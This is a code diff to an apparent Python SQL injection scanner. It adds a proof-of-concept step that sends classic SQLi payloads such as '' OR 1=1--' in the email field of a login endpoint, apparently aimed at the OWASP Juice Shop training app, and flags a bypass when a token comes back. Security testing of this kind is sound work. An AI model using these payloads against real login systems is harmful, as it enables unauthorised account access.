@@ -151,6 +151,11 @@ class SQLiScanner:
         response = http_client.request(Method.POST, path=test_url, json=json_body)
         found = next((signature for signature in self.error_signatures if signature in response.body), None)
         if found:
+            # We found an error. Now let's try to exploit it if it's a login endpoint.
+            if "login" in test_url.lower():
+                if self._attempt_auth_bypass_poc(http_client, test_url, findings_list):
+                    return True # Successfully exploited, no need to log the error-based one
+                    
             findings_list.append(RawFinding(
                 vuln_id="INJ-SQLI-ERROR-BASED",
                 endpoint=test_url,
@@ -178,4 +183,38 @@ class SQLiScanner:
                 )
             ))
             return True
+        return False
+        
+    def _attempt_auth_bypass_poc(self, http_client, test_url, findings_list) -> bool:
+        """Attempts an active Authentication Bypass using common SQLi payloads."""
+        bypass_payloads = [
+            "'--",
+            "' OR 1=1--",
+            "' OR '1'='1"
+        ]
+        
+        # Typically the vulnerable parameter in login is email or username
+        for payload in bypass_payloads:
+            json_body = {
+                "email": f"admin@juice-sh.op{payload}", 
+                "password": "a"
+            }
+            try:
+                response = http_client.request(Method.POST, path=test_url, json=json_body)
+                
+                # Check if we bypassed auth (HTTP 200 and 'token' in response)
+                if response.code == 200 and "token" in response.body.lower():
+                    findings_list.append(RawFinding(
+                        vuln_id="INJ-SQLI-AUTH-BYPASS",
+                        endpoint=test_url,
+                        evidence=Evidence(
+                            request=f"POST {test_url}\n{json_body}",
+                            response=f"HTTP/1.1 200 OK\n\n{response.body[:300]}... [TOKEN EXTRACTED]",
+                            parameters=["email"]
+                        )
+                    ))
+                    return True
+            except Exception as e:
+                logging.error(f"Error during PoC attempt: {e}")
+                
         return False
